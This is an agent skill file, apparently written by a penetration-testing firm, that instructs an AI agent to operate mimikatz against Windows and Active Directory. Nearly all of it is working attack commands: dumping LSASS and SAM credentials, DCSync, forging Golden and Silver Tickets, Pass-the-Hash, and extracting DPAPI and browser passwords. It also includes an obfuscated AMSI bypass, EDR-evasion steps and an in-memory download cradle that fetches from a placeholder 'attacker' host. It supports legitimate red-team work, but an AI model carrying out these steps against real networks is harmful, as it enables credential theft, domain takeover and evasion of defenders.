---
name: mimikatz
description: >
  Operate mimikatz — the definitive Windows credential extraction and Active Directory
  attack tool. Use when extracting credentials from Windows memory or the SAM database,
  performing DCSync attacks, forging Kerberos tickets (Golden/Silver), conducting
  Pass-the-Hash or Pass-the-Ticket attacks, or any AD post-exploitation requiring credential
  access. Covers all major modules (sekurlsa, lsadump, kerberos, token, crypto, dpapi, vault),
  in-memory execution via Invoke-Mimikatz, Cobalt Strike integration, detection evasion
  techniques, and complete AD attack chains.
license: CC-BY-4.0
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/gentilkiwi/mimikatz
---

# mimikatz Agent Skill

## When to Use This Skill

Use this skill when:
- Extracting cleartext credentials or NTLM hashes from Windows LSASS memory
- Performing DCSync to dump domain credentials without touching disk on a DC
- Forging Golden Tickets or Silver Tickets for persistence or lateral movement
- Conducting Pass-the-Hash, Pass-the-Ticket, or Over-Pass-the-Hash attacks
- Dumping SAM database, LSA secrets, or cached credentials
- Bypassing Credential Guard or harvesting DPAPI master keys
- Running mimikatz from memory to avoid AV/EDR detection

## What mimikatz Does

mimikatz is a Windows credential extraction framework created by Benjamin Delpy. It directly
reads from LSASS process memory to extract plaintext passwords, NTLM hashes, Kerberos
tickets, and certificates stored by Windows authentication providers. In AD environments it
is the primary tool for credential harvesting, ticket forging, and identity-based lateral
movement. Nearly every major AD attack chain involves mimikatz or its embedded derivatives.

## Installation and Execution

### Pre-compiled binary

```cmd
:: Download from GitHub releases (x64 recommended)
:: https://github.com/gentilkiwi/mimikatz/releases
mimikatz.exe

:: Requires SeDebugPrivilege — elevate first
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### From memory (PowerShell — Invoke-Mimikatz)

```powershell
# Load Invoke-Mimikatz from remote or local source
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'

# Write output to file
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' | Out-File -Encoding ASCII creds.txt

# DCSync via Invoke-Mimikatz
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /all /csv"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:CORP\Administrator"'
```

### Cobalt Strike integration

```
# From Beacon (SYSTEM or elevated context)
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::dcsync /user:CORP\krbtgt

# hashdump command uses injected mimikatz internally
hashdump

# logonpasswords built-in alias
logonpasswords
```

## Privilege Setup (Always First)

```
mimikatz # privilege::debug
# Output: Privilege '20' OK — grants SeDebugPrivilege for LSASS access

mimikatz # token::elevate
# Impersonate SYSTEM token — required for some lsadump operations
# Use: token::elevate /domainadmin to seek a DA token from memory

mimikatz # token::whoami
# Show current impersonation state

mimikatz # token::revert
# Drop back to original token
```

## sekurlsa Module — LSASS Credential Extraction

### sekurlsa::logonpasswords

Extracts all credentials from LSASS memory: NTLM hashes, cleartext passwords (if wdigest
enabled), Kerberos tickets, and DPAPI master keys.

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

:: Output structure per session:
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : jsmith
Domain            : CORP
Logon Server      : DC01
Logon Time        : ...
SID               : S-1-5-21-...
  msv :
    [00000003] Primary
    * Username : jsmith
    * Domain   : CORP
    * NTLM     : aad3b435b51404eeaad3b435b51404ee  ← LM blank
    * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c  ← real NTLM
    * SHA1     : ...
  wdigest :
    * Username : jsmith
    * Domain   : CORP
    * Password : (null)  ← cleartext if wdigest enabled
  kerberos :
    * Username : jsmith
    * Domain   : CORP.LOCAL
    * Password : (null)
```

### sekurlsa::wdigest

```
mimikatz # sekurlsa::wdigest
# Requires WDigest auth enabled (reg add on older systems or modified registry)
# On Windows 7/2008R2 cleartext usually present
# On Win8.1+/2012R2+ requires:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Wait for user to re-authenticate, then run sekurlsa::wdigest
```

### sekurlsa::kerberos

```
mimikatz # sekurlsa::kerberos
# Lists Kerberos credentials in memory including AES keys
# Output includes: Username, Domain, Password (if available), encryption keys
```

### sekurlsa::tickets

```
mimikatz # sekurlsa::tickets
# List all Kerberos tickets in memory for all sessions
mimikatz # sekurlsa::tickets /export
# Export .kirbi files to disk for each ticket
# Files: [session]-[user]@[target]-[domain].kirbi
```

### sekurlsa::ekeys

```
mimikatz # sekurlsa::ekeys
# Extract AES128/AES256 Kerberos encryption keys
# Critical for creating AES-encrypted Golden/Silver Tickets (less detectable than RC4)
```

### sekurlsa::credman

```
mimikatz # sekurlsa::credman
# Dump Windows Credential Manager entries from LSASS
```

### sekurlsa::minidump — offline LSASS analysis

```cmd
:: 1. Create LSASS minidump (on target, many methods)
:: Task Manager → Processes → lsass.exe → Create dump file
:: Or via PowerShell:
powershell -c "& {$p = Get-Process lsass; $t = [System.IO.Directory]::GetCurrentDirectory(); [System.Diagnostics.Process]::GetProcessById($p.Id) | Out-Null; (New-Object -TypeName System.Runtime.InteropServices.HandleRef).Value; rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $($p.Id) lsass.dmp full}"
:: Or: procdump64.exe -accepteula -ma lsass.exe lsass.dmp

:: 2. Copy lsass.dmp to analysis machine
:: 3. Parse offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

## lsadump Module — SAM, Secrets, DCSync

### lsadump::sam — Local SAM database

```
:: Must run as SYSTEM (token::elevate first)
mimikatz # token::elevate
mimikatz # lsadump::sam
:: Dumps local user NTLM hashes from SAM hive

:: Offline SAM extraction:
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
mimikatz # lsadump::sam /system:system.hive /sam:sam.hive
```

### lsadump::secrets — LSA Secrets

```
mimikatz # token::elevate
mimikatz # lsadump::secrets
:: Extracts: service account credentials, DPAPI machine key,
::           domain cached credentials (DCC2), DefaultPassword, NL$KM key
```

### lsadump::cache — Cached Domain Credentials (DCC2)

```
mimikatz # token::elevate
mimikatz # lsadump::cache
:: Hash format: $DCC2$10240#username#hash
:: Crack with hashcat -m 2100

:: Offline:
mimikatz # lsadump::cache /system:system.hive /security:security.hive
```

### lsadump::dcsync — DCSync (No LSASS touch on DC)

The most critical AD credential attack — replicates directory data as if mimikatz is a DC.
Requires: Domain Admin, Domain Controller, or explicit replication rights (Replicating
Directory Changes + Replicating Directory Changes All).

```
:: Dump single user (target krbtgt for Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:CORP\krbtgt

:: Output includes:
:: Object GUID: ...
:: * SAMAccountName : krbtgt
:: * Object Security ID : S-1-5-21-...
:: * Credentials:
::   Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c   ← key for Golden Ticket
::   ntlm- 0: ...
::   lm  - 0: ...
::   aes256_hmac: ...                                ← use for AES Golden Ticket
::   aes128_hmac: ...

:: Dump all domain accounts
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
:: CSV format: RID,username,NTLM,account_flags

:: Dump from a specific DC
mimikatz # lsadump::dcsync /domain:corp.local /dc:dc01.corp.local /user:Administrator

:: With Invoke-Mimikatz (remote)
Invoke-Mimikatz -ComputerName dc01.corp.local \
  -Command '"lsadump::dcsync /domain:corp.local /user:CORP\krbtgt"'
```

## kerberos Module — Ticket Operations

### kerberos::golden — Golden Ticket

Forges a TGT signed with the krbtgt NTLM hash. Provides unlimited domain access.

```
:: Prerequisites: krbtgt NTLM hash + domain SID
:: Get domain SID: whoami /user → S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ

mimikatz # kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-1234567890-1234567890-1234567890 \
  /krbtgt:8846f7eaee8fb117ad06bdd830b7586c \
  /id:500 \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi

:: AES-256 variant (stealthier — avoids RC4 downgrade detection)
mimikatz # kerberos::golden \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-... \
  /aes256:aes256_key_from_dcsync \
  /ticket:golden_aes.kirbi

:: Golden ticket with extra SID (for forest trust abuse)
mimikatz # kerberos::golden \
  /user:Administrator /domain:child.corp.local \
  /sid:S-1-5-21-CHILD-SID \
  /krbtgt:HASH \
  /sids:S-1-5-21-PARENT-SID-519 \    ← inject Enterprise Admins
  /ticket:golden_forest.kirbi
```

### kerberos::silver — Silver Ticket

Forges a TGS for a specific service. Requires the service account NTLM hash.

```
:: Target CIFS service on a server (file share access)
mimikatz # kerberos::silver \
  /user:Administrator \
  /domain:corp.local \
  /sid:S-1-5-21-... \
  /target:fileserver.corp.local \
  /service:cifs \
  /rc4:service_account_ntlm_hash \
  /ticket:silver_cifs.kirbi

:: HTTP service (for WinRM/IIS)
mimikatz # kerberos::silver \
  /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /target:webserver.corp.local /service:http \
  /rc4:HASH /ticket:silver_http.kirbi

:: HOST service (for scheduled tasks)
:: LDAP service (for DCSync with Silver Ticket)
:: MSSQL service (for SQL Server access)
```

### kerberos::ptt — Pass-the-Ticket

```
:: Inject .kirbi ticket into current session
mimikatz # kerberos::ptt golden.kirbi

:: Inject multiple tickets
mimikatz # kerberos::ptt silver_cifs.kirbi
mimikatz # kerberos::ptt silver_http.kirbi

:: Verify injection
klist                    ← shows injected tickets

:: Access resource using injected ticket
dir \\fileserver.corp.local\C$
```

### kerberos::list / kerberos::purge

```
mimikatz # kerberos::list          :: list all tickets in session
mimikatz # kerberos::list /export  :: export all .kirbi files
mimikatz # kerberos::purge         :: clear all tickets from session
```

## token Module — Token Manipulation

```
mimikatz # token::elevate                   :: impersonate SYSTEM
mimikatz # token::elevate /domainadmin      :: find and impersonate a DA token
mimikatz # token::impersonate               :: list available tokens
mimikatz # token::impersonate /user:jsmith  :: impersonate specific user token
mimikatz # token::run /process:cmd.exe      :: spawn process as impersonated user
mimikatz # token::revert                    :: revert to original token
mimikatz # token::whoami                    :: show current impersonation
```

## crypto Module — Certificate Extraction

```
mimikatz # crypto::certificates             :: list certificates in system store
mimikatz # crypto::certificates /export     :: export certs (creates .der/.pfx files)
mimikatz # crypto::certificates /systemstore:LOCAL_MACHINE /store:My /export
:: Useful for extracting ADCS certificates for persistence (ESC8, ESC1 chains)

mimikatz # crypto::keys                     :: list CNG/CAPI keys
mimikatz # crypto::keys /export             :: export private keys (bypass non-exportable)
```

## dpapi Module — DPAPI Secret Extraction

```
:: DPAPI protects: browser passwords, WiFi keys, RDP creds, certificate keys

:: List DPAPI master keys
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-...\<guid>"

:: Decrypt using user password
mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\...\<guid>" /password:UserPass1!

:: Decrypt with domain backup key (requires DA)
mimikatz # lsadump::backupkeys /system:dc01.corp.local /export
mimikatz # dpapi::masterkey /in:"<guid>" /pvk:ntds_capi_0.pvk

:: Extract Chrome/Edge passwords
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
```

## vault Module — Windows Credential Vault

```
mimikatz # vault::list     :: list Credential Vault entries
mimikatz # vault::cred     :: dump credential contents (scheduled tasks, SSPI)
mimikatz # vault::cred /patch   :: patch vault to dump non-exportable creds
```

## AD Attack Chains

### DCSync → Golden Ticket → Domain Persistence

```
:: 1. DCSync for krbtgt hash (run from DA context)
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:corp.local /user:CORP\krbtgt
:: Note: NTLM hash + AES256 key

:: 2. Get domain SID
mimikatz # lsadump::dcsync /domain:corp.local /user:CORP\Administrator
:: Or: wmic useraccount where name='Administrator' get sid

:: 3. Forge Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:NTLM_HASH /ticket:golden.kirbi

:: 4. Inject and use
mimikatz # kerberos::ptt golden.kirbi
dir \\dc01.corp.local\C$        :: verify access
```

### Pass-the-Hash (PtH)

```
:: Use NTLM hash without cleartext password
mimikatz # sekurlsa::pth \
  /user:Administrator \
  /domain:corp.local \
  /ntlm:8846f7eaee8fb117ad06bdd830b7586c \
  /run:cmd.exe
:: Spawns cmd.exe with Administrator's NTLM credentials injected

:: Lateral movement via PtH
mimikatz # sekurlsa::pth /user:svc_backup /domain:corp \
  /ntlm:HASH /run:"powershell -c Enter-PSSession -ComputerName server02"
```

### Over-Pass-the-Hash (Pass-the-Key)

```
:: Convert NTLM hash to Kerberos TGT (avoids NTLM authentication)
mimikatz # sekurlsa::pth \
  /user:Administrator \
  /domain:corp.local \
  /ntlm:HASH \
  /aes256:AES256_KEY \
  /run:cmd.exe
:: Requests a TGT using the key — uses Kerberos instead of NTLM
:: Much stealthier against NTLM monitoring
```

### Kerberoasting Chain

```
:: 1. Find SPNs (PowerView or built-in)
setspn -Q */* | grep -i corp.local

:: 2. Request TGS tickets (Rubeus or PowerView)
Rubeus.exe kerberoast /format:hashcat /outfile:spn_hashes.txt

:: 3. Crack TGS-REP 23 hashes (hashcat)
hashcat -m 13100 spn_hashes.txt rockyou.txt -r rules/best64.rule

:: 4. Use cracked password for lateral movement
mimikatz # sekurlsa::pth /user:svc_sql /domain:corp.local /ntlm:CRACKED_NTLM /run:cmd.exe
```

## Detection Evasion

### AMSI Bypass (PowerShell in-memory)

```powershell
# Basic AMSI patch before loading Invoke-Mimikatz
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Or use obfuscated loader
$a=[Ref].Assembly.GetType('System.Management.Automation.A'+'msiUtils')
$b=$a.GetField('amsiI'+'nitFailed','NonPublic,Static')
$b.SetValue($null,$true)
```

### Avoiding LSASS touch (alternative methods)

```cmd
:: Use procdump with SYSTEM privilege (may bypass some EDR hooks)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
:: Then parse offline with sekurlsa::minidump

:: comsvcs.dll MiniDump (LOLBin)
rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump (Get-Process lsass).Id lsass.dmp full

:: Task Manager (GUI) — least suspicious
:: Right-click lsass.exe → Create dump file
```

### Use AES keys instead of RC4/NTLM for tickets

```
:: Golden/Silver tickets with RC4 trigger 'Kerberos Pre-Authentication using DES or RC4' alerts
:: Use /aes256: parameter in kerberos::golden and kerberos::silver
:: Source AES keys via: sekurlsa::ekeys or lsadump::dcsync
```

### Cobalt Strike reflective injection

```
# Inject mimikatz into a sacrificial process (not beacon itself)
spawn x64 smss.exe
inject <PID> x64 mimikatz
# Or use the built-in logonpasswords/hashdump which use mimikatz internally
```

## Troubleshooting

**`ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory`**
```
:: Not elevated or SeDebugPrivilege denied
:: Fix: run as Administrator, then: privilege::debug
:: Or: token::elevate before sekurlsa commands
```

**`sekurlsa::logonpasswords` shows no passwords (only null)**
```
:: WDigest disabled (default on Win8.1+/2012R2+)
:: Enable and wait for re-auth:
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
:: Or use NTLM hashes for PtH instead of cleartext
```

**`lsadump::dcsync` — Access Denied**
```
:: Need: Domain Admin, Domain Controller account, or explicit Replication rights
:: Grant replication rights (if you have DA):
Add-ADPermission "DC=corp,DC=local" -User attacker -AccessRights ExtendedRight -ExtendedRight "Replicating Directory Changes"
Add-ADPermission "DC=corp,DC=local" -User attacker -AccessRights ExtendedRight -ExtendedRight "Replicating Directory Changes All"
```

**AV/EDR blocking mimikatz.exe**
```
:: Option 1: Invoke-Mimikatz (in-memory PowerShell)
:: Option 2: Rebuild from source with changed signatures
:: Option 3: Use Cobalt Strike built-in mimikatz integration
:: Option 4: Use alternative tools (pypykatz for offline, nanodump for LSASS dump)
:: Option 5: Encrypt/pack binary then decrypt at runtime
```

**Golden ticket not working / klist shows ticket but access denied**
```
:: Domain SID may be wrong — verify with: whoami /user (on domain-joined machine)
:: Ticket may be for wrong domain — check /domain: parameter
:: Reset: kerberos::purge, then re-inject with correct parameters
:: Time skew: ensure system time within 5 minutes of DC
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> **Related reading**: [How to Attack-Test Your Own Domain Controllers Before an Adversary Does](https://redhound.us/attack-test-domain-controllers)
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
